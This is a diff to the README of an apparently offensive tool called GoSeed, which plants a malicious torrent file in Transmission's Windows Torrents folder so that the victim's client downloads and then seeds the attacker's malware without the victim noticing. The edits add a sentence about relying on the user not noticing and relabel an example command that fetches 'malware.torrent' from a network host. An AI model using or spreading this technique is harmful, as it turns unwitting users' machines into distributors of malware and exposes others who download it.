@@ -2,7 +2,7 @@
 
 This isn't a "spreading" technique technically, it's more of a way to force a victim to seed our malicious torrent file. This targets Transmission's Windows client.
 
-Transmission's client has a folder named Torrents which contains a list of currently downloading torrents. We can add our malicious torrent here and it will begin to auto download when the user opens up Transmission. Once the download is finished, then the victim will begin seeding our malware that is inside the torrent.
+Transmission's client has a folder named Torrents which contains a list of currently downloading torrents. We can add our malicious torrent here and it will begin to auto download when the user opens up Transmission. Once the download is finished, then the victim will begin seeding our malware that is inside the torrent. This relies on the user somehow not noticing that our torrent is being downloaded and seeded. 
 
 # Compiling
 
@@ -23,6 +23,6 @@ GoSeed is a command-line tool, you pass the URL to the malicious torrent file to
 3. Download the torrent file to Transmission's Torrents/ folder
 
 
-EX: 
+Example Usage: 
 
 * `seed.exe -url http://192.168.1.231:8000/malware.torrent`
